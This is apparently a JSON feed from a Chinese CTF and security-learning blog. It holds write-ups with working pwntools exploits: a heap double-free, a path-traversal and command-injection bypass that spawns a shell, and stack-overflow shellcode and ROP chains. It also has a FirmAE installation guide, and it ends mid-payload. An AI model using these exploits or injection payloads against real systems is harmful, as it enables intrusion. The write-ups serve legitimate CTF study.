class=\"string\">&quot;aaa&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">&quot;bbb&quot;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">&quot;xielu&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x100</span>,<span class=\"string\">&quot;dizhi&quot;</span>) # <span class=\"number\">3</span> 泄露地址用</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">&quot;hebing&quot;</span>) # 防止合并</span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\">show(<span class=\"number\">3</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\">libc_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,b<span class=\"string\">&quot;\\x00&quot;</span>)) - <span class=\"number\">0x3c4b78</span></span><br><span class=\"line\">print(hex(libc_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\"># fastbin double free修改</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,p64(<span class=\"number\">0x602022</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">&quot;a&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">&quot;b&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">#pause()</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,b<span class=\"string\">&quot;\\x40\\x00\\x00\\x00\\x00\\x00&quot;</span>+p64(libc_addr+<span class=\"number\">0x4527a</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"server\"><a href=\"#server\" class=\"headerlink\" title=\"server\"></a>server</h1><p>​\t\t当时做的时候没想到栈的重叠的问题,单纯过滤肯定是没戏的.咋说捏,只会一些传统的套路是不行的,那只是基础,要在此之上更上一个纬度,看清事物的本质,学会变通才能应对更复杂的情况.</p>\n<p>​\t\t对此题的反思就是,首先还是基础,要打好基础,打好操作系统原理的基础,如果懂这个的话,估计其实很容易想到重叠的问题.然后再培养细心以及一些自动化工具帮你寻找类似的点.</p>\n<h2 id=\"思路一\"><a href=\"#思路一\" class=\"headerlink\" title=\"思路一\"></a>思路一</h2><p>​\t\taccess校验的长度有限,为32</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">snprintf</span>(name, <span class=\"number\">0x20</span>uLL, <span class=\"string\">&quot;/keys/%s.key&quot;</span>, s);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">这个长度是<span class=\"number\">27</span>,加上/keys就是<span class=\"number\">32</span>了</span><br><span class=\"line\">../../../../../././bin/sh #</span><br><span class=\"line\">    </span><br><span class=\"line\">/keys/../../../../../././bin/sh 最后access的是这个文件,肯定是存在的</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t</p>\n<p>​\t\t然后就是命令拼接了,<font color=\"red\">存在未初始化漏洞,栈上有残留数据</font></p>\n<p>​\t\t第二次输入个单引号就好了, \\n也可以作为命令分隔符,所以前面那个add_user -u ‘’就是没用的了,直接执行后面的&#x2F;bin&#x2F;sh了</p>\n<p>​\t\t过滤 ; &amp; &#96; | $ 空格 ( ) {} - &#x2F; \\</p>\n<p>​\t\t这个不用写脚本,</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第一次选<span class=\"number\">1</span>,输入</span><br><span class=\"line\">../../../../../././bin/sh #</span><br><span class=\"line\">然后选<span class=\"number\">2</span>,输入</span><br><span class=\"line\">&#x27;</span><br><span class=\"line\">然后就闭合了,就可以getshell了</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"string\">&quot;add_user -u &#x27;%s&#x27; -p &#x27;888888&#x27;&quot;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">► <span class=\"number\">0x555555555748</span>    call   system@plt                &lt;system@plt&gt;</span><br><span class=\"line\">        command: <span class=\"number\">0x7fffffffe410</span> ◂— <span class=\"string\">&quot;add_user -u &#x27;&#x27;\\n/bin/sh #&#x27; -p &#x27;888888&#x27;&quot;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"思路二\"><a href=\"#思路二\" class=\"headerlink\" title=\"思路二\"></a>思路二</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;\\ncat\\tfl*\\n</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t这里也用到覆盖了,看exp就可以理解了,exp的12就是随便输入的,后面的’\\n会替代</p>\n<p>​\t\t\t\t过滤的空格可以用\\t替代</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = <span class=\"string\">&quot;./pwn_7&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(elf)</span><br><span class=\"line\"><span class=\"comment\">#p =remote(&quot;node4.buuoj.cn&quot;, 25471)</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Your choice &gt;&gt;&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Please input the key of admin : &quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;../../../../../../../../../&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(p.recv())</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Your choice &gt;&gt;&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Please input the username to add :&quot;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b&quot;xxcat\\tfl*\\n&quot;</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">p.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Your choice &gt;&gt;&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Please input the username to add :&quot;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b&quot;&#x27;&quot;</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(p.recv(<span class=\"number\">1024</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(p.recv(<span class=\"number\">1024</span>))</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t 能不能’cat\\tfl*\\n呢,不能呀,,需要有个\\n,但是没有,也没有; 没有分隔符没办法执行两条命令,这个必须要\\n的 \\t不行吗,不行…….</p>\n<p><a href=\"https://blog.51cto.com/u_15400016/4287727\">https://blog.51cto.com/u_15400016/4287727</a></p>\n<p><a href=\"https://www.secpulse.com/archives/96374.html\">https://www.secpulse.com/archives/96374.html</a></p>\n<h1 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h1><p>用recv应该是接收到\\n为止? 所</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7firmae%E5%AE%89%E8%A3%85/",
            "url": "https://tangzichengcc.github.io/%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7firmae%E5%AE%89%E8%A3%85/",
            "title": "固件模拟工具firmae安装",
            "date_published": "2023-06-03T12:09:40.000Z",
            "content_html": "<p>​\t\t因为最近在做iot相关的漏洞复现,搭建环境是很重要的一环,qemu可以直接搭建,但有时候一些细节会导致一些问题,所以firmae是一个集成化的工具,可以帮助一键搭建环境.</p>\n<p>​\t\t但是安装这个工具的时候..又发生了奇奇怪怪的问题…记录一下.. 搞计算机遇到报错太正常了,但同样也是非常搞人心态的,学会如何排错,如何利用搜索引擎(包含chatgpt!)来解决问题是很重要的一个能力!</p>\n<p>​\t\t有一说一,能真机还是最好别虚拟… 当然没有那么多钱、也不一定能买到,虚拟也是不错的</p>\n<p>工具地址:<a href=\"https://github.com/pr0v3rbs/FirmAE\">https://github.com/pr0v3rbs/FirmAE</a></p>\n<p>搭建环境:ubuntu18</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone --recursive https://github.com/pr0v3rbs/FirmAE</span><br><span class=\"line\">./download.sh               # 就是一个下载脚本,单纯的download..(国内服务器买香港的,或者用国外的..或者...</span><br><span class=\"line\">./install.sh</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t然后报错了…一堆红…</p>\n<p>​\t\t其实如果不确定是哪里报错了,可以拆看sh脚本,一点一点执行,看看</p>\n<p>​\t\t报错:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./psycopg/psycopg.h:<span class=\"number\">35</span>:<span class=\"number\">10</span>: fatal error: Python.h: No such file or directory</span><br><span class=\"line\">   <span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Python.h&gt;</span></span></span><br><span class=\"line\">            ^~~~~~~~~~</span><br><span class=\"line\">  compilation terminated.</span><br></pre></td></tr></table></figure>\n\n<p>解决方案:<a href=\"https://stackoverflow.com/questions/19843945/psycopg-python-h-no-such-file-or-directory\">https://stackoverflow.com/questions/19843945/psycopg-python-h-no-such-file-or-directory</a></p>\n<p>​\t\t其实不解决貌似后面也能搭建起来,好像是一路畅通,但运行起来还是显示不了页面等,肯定有问题,所以还是要解决的.</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install python3-dev</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t运行完后重新跑一遍install脚本,出现这个,一路输入y</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Reversed (or previously applied) patch detected!  Assume -R? [n]</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t开始模拟</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./init.sh</span><br><span class=\"line\"></span><br><span class=\"line\">wget https:<span class=\"comment\">//github.com/pr0v3rbs/FirmAE/releases/download/v1.0/DIR-868L_fw_revB_2-05b02_eu_multi_20161117.zip</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-0</span><span class=\"number\">-9</span>-ubuntu:/home/ubuntu/FirmAE# ./run.sh -r tenda DIR868L_B1_FW205WWb02.bin</span><br><span class=\"line\">[*] DIR868L_B1_FW205WWb02.bin emulation start!!!</span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File <span class=\"string\">&quot;./sources/extractor/extractor.py&quot;</span>, line <span class=\"number\">19</span>, in &lt;module&gt;</span><br><span class=\"line\">    import binwalk</span><br><span class=\"line\">ModuleNotFoundError: No module named <span class=\"string\">&#x27;binwalk&#x27;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t不能直接pip3 install binwalk! 也不能apt install binwalk!!!!</p>\n<p>​\t\t参考:<a href=\"https://www.secpulse.com/archives/201139.html\">https://www.secpulse.com/archives/201139.html</a></p>\n<p>​\t\t可以观察到它目录下有binwalk这个目录,cd进去后 python3 setup.py install</p>\n<p><img src=\"/%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7firmae%E5%AE%89%E8%A3%85/image-20230603202938128.png\" alt=\"image-20230603202938128\"></p>\n<p>​\t\t<font color=\"red\">解压固件要用这个命令 (github上也没说啊!!!!)</font></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">binwalk -Me xxxx.bin --run-as=root</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t然后再run就可以了(有时候环境比较复杂,不知道哪个开的有影响,采用<font color=\"red\">重启大法!</font> 重启后init,然后run)</p>\n<p><img src=\"/%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7firmae%E5%AE%89%E8%A3%85/image-20230603210311207.png\" alt=\"image-20230603210311207\"></p>\n<p>​\t\t由于模拟环境是在云服务器上上的内网网卡,公网无法直接访问,需要做个端口转发,</p>\n<p>​\t\tgost:<a href=\"https://github.com/ginuerzh/gost\">https://github.com/ginuerzh/gost</a></p>\n<p>​\t\tgzip -d 解压</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gost -L=tcp://:2222/192.168.0.2:80</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t然后就可以访问了!!!</p>\n<p><img src=\"/%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7firmae%E5%AE%89%E8%A3%85/image-20230603210402320.png\" alt=\"image-20230603210402320\"></p>\n",
            "tags": [
                "路由器"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/",
            "title": "pwn入门-30-2023OUC校赛",
            "date_published": "2023-06-03T08:18:00.000Z",
            "content_html": "<p>​\t\t拖了挺久才整理…不应该…以后要及时复盘. 本身题不是很难,不过有很多小细节,自己之前没弄懂,还是说有时间的话,多研究研究,以及之前的题,要进行一定的复盘.</p>\n<h2 id=\"恢复符号\"><a href=\"#恢复符号\" class=\"headerlink\" title=\"恢复符号\"></a>恢复符号</h2><p>​\t\t比较恶心的一个点(其实也不恶心,就是自己之前没弄过),找到了一些文章,然后github有编译好的符号文件,可以直接ida导入就好了,回头有时间可以自己编译一下</p>\n<p>​\t\t<a href=\"https://github.com/maroueneboubakri/lscan\">https://github.com/maroueneboubakri/lscan</a></p>\n<p>​\t\t<a href=\"https://blog.csdn.net/Breeze_CAT/article/details/103788796\">https://blog.csdn.net/Breeze_CAT/article/details/103788796</a></p>\n<p>​\t\tida中shift+f5,然后把符号文件添加进去</p>\n<p>​\t\t还有就是一些地址的计算…头大,,(估计还是原理没完全搞明白)</p>\n<h2 id=\"pwn1\"><a href=\"#pwn1\" class=\"headerlink\" title=\"pwn1\"></a><strong>pwn1</strong></h2><p>​\t\t栈长度是0x68 &#x3D; 104,但能读取256,很明显的栈溢出,可以覆盖返回地址,而且没有开NX保护,可以写shellcode,于是问题就变成了怎么跳到shellcode呢,或者怎么知道shellcode的地址,puts的话,遇到\\x00才会停止所以可以前面填满,然后输出ebp这里的值,这里的值好像会有一些变化,所以可以不用太具体,前面一直加nop就好了,跳到nop然后走,然后shellcode</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>d:<span class=\"number\">0074</span>│     <span class=\"number\">0xffffd4f4</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">1</span>e:<span class=\"number\">0078</span>│ ebp <span class=\"number\">0xffffd4f8</span> —▸ <span class=\"number\">0xffffd508</span> ◂— <span class=\"number\">0x0</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\tebp和esp差了0x90 esp和ecx(开始输出字符串那里)差了0x28,ebp输出的值和ebp差了0xbe,这样有点乱,画图会清晰很多</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/image-20230603191839695.png\" alt=\"image-20230603191839695\" style=\"zoom: 33%;\">\n\n<p>​\t\t这样其实有问题,不太对,因为ebp那里的值其实是不确定的,但总是会往前指,或多或少,有时候正好指到shellcode开头或者偏移一点点,至于为什么呢…可以后面在研究,可以简单的跳到这个位置就好了,加一些nop(但是打远程的时候不知道为什么老不成功,可以加一点偏移,因为毕竟是往前跳)</p>\n<p>​\t\t有system有&#x2F;bin&#x2F;sh 能不能rop呢?</p>\n<p>p32(addr-0xbe+0x2e+0x28)</p>\n<p>​\t\t</p>\n<p>​\t\t换句话说,ebp这个位置的值如果正好位于 [ebp-0x68,ebp-len(shellcode)]之间的话,就正好到了nop,如果大的话,就需要我们来加一点值了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh = process(&#x27;./pwn1&#x27;)</span></span><br><span class=\"line\">sh = remote(<span class=\"string\">&quot;101.43.247.245&quot;</span>,<span class=\"number\">9200</span>)</span><br><span class=\"line\"><span class=\"comment\">#systemaddr = 0x8048440</span></span><br><span class=\"line\"><span class=\"comment\">#binsh = 0x80486C0</span></span><br><span class=\"line\"><span class=\"comment\">#sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh,&quot;b *0x80488F2&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">b&quot;say&quot;</span>)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x68</span>)</span><br><span class=\"line\"><span class=\"comment\">#addr = u32(sh.recv(8)[4:8])</span></span><br><span class=\"line\">sh.recv(<span class=\"number\">0x68</span>)</span><br><span class=\"line\">addr = u32(sh.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br><span class=\"line\">nop = asm(<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        nop</span></span><br><span class=\"line\"><span class=\"string\">        &#x27;&#x27;&#x27;</span>)</span><br><span class=\"line\">shellcode = nop*<span class=\"number\">30</span>+shellcode</span><br><span class=\"line\">payload = shellcode.ljust(<span class=\"number\">0x68</span>, <span class=\"string\">b&#x27;b&#x27;</span>) + p32(<span class=\"number\">0</span>)+p32(addr+<span class=\"number\">0xbe</span>-<span class=\"number\">0x78</span>+<span class=\"number\">0x10</span>-<span class=\"number\">4</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(addr))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(addr+<span class=\"number\">0xbe</span>-<span class=\"number\">0x90</span>+<span class=\"number\">0x28</span>+<span class=\"number\">4</span>))</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./pwn01&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#sh = remote(&quot;101.43.247.245&quot;,9200)</span></span><br><span class=\"line\"><span class=\"comment\">#systemaddr = 0x8048440</span></span><br><span class=\"line\"><span class=\"comment\">#binsh = 0x80486C0</span></span><br><span class=\"line\"><span class=\"comment\">#sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh,&quot;b *0x80488F2&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">b&quot;say&quot;</span>)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x68</span>)</span><br><span class=\"line\"><span class=\"comment\">#addr = u32(sh.recv(8)[4:8])</span></span><br><span class=\"line\">sh.recv(<span class=\"number\">0x68</span>)</span><br><span class=\"line\">addr = u32(sh.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(addr))</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br><span class=\"line\">nop = asm(<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        nop</span></span><br><span class=\"line\"><span class=\"string\">        &#x27;&#x27;&#x27;</span>)</span><br><span class=\"line\">shellcode = nop*<span class=\"number\">40</span>+shellcode</span><br><span class=\"line\">payload = shellcode.ljust(<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;b&#x27;</span>) + p32(<span class=\"number\">0</span>)+p32(addr+<span class=\"number\">0x2e</span>+<span class=\"number\">0x28</span>-<span class=\"number\">4</span>)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/image-20230603182001856.png\" alt=\"image-20230603182001856\"></p>\n<p>还遇到很玄学的问题,nop加多了,怎么也不行,</p>\n<p>感觉像是后面的指令并没有识别出来      不多,好像是没传送完全?</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/image-20230603182755733.png\" alt=\"image-20230603182755733\"></p>\n<h2 id=\"pwn2\"><a href=\"#pwn2\" class=\"headerlink\" title=\"pwn2\"></a><strong>pwn2</strong></h2><p>​\t\t加了nx保护,用rop吧,ret2syscall, 这下不用算哪个比较恶心的shellcode的位置了,用ret2syscall是因为没有找到system函数..</p>\n<p>​\t\texecve(“&#x2F;bin&#x2F;sh”,NULL,NULL)</p>\n<p>​\t\t其中，该程序是 32 位，所以我们需要使得</p>\n<ul>\n<li><p>系统调用号，即 eax 应该为 0xb</p>\n</li>\n<li><p>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</p>\n</li>\n<li><p>第二个参数，即 ecx 应该为 0</p>\n</li>\n<li><p>第三个参数，即 edx 应该为 0</p>\n<p>没有 &#x2F;bin&#x2F;sh,那就写入到栈后面,反正需要栈的地址,计算一下就可以了</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x080b8eb6 : pop eax ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">0x080481c9 : pop ebx ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">0x080df8bd : pop ecx ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">0x0806f83b : pop edx ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">0x0806d443 : int 0x80</span><br><span class=\"line\"></span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x08048798 : leave ; ret</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t写一下payload</p>\n<p>​\t\t栈是104+4(ebp) &#x3D; 108, 溢出了 256-108 &#x3D; 148字节</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">binsh =  addr + <span class=\"number\">10</span>*<span class=\"number\">4</span></span><br><span class=\"line\">payload= b<span 